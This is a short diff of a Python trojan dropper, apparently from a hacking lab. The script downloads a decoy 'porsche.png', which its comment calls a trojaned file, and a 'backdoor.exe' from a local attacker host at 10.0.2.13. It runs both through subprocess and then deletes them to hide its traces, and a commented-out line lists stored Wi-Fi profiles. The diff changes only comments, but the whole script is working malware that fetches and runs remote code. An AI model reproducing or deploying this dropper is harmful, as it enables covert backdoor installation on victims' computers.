@@ -18,11 +18,12 @@ def download(url):
 #command = "netsh wlan show profile" #-show wlan profiles stored on Winx.x computer
 temp_directory = tempfile.gettempdir()
 os.chdir(temp_directory)
-download("http://10.0.2.13/hackfiles/porsche.png")
+
+download("http://10.0.2.13/hackfiles/porsche.png") #initial trojaned file to display
 subprocess.Popen("porsche.png", shell=True) #Popen - file will run in the background and allow program to continue executing
 
 download("http://10.0.2.13/hackfiles/backdoor.exe")
-subprocess.call("backdoor.exe", shell=True) #.call - allow program to continue executing
+subprocess.call("backdoor.exe", shell=True) #.call - allow program to continue executing until completion
 
 os.remove("porsche.png") #delete executed file once it finishes
 os.remove("backdoor.exe")
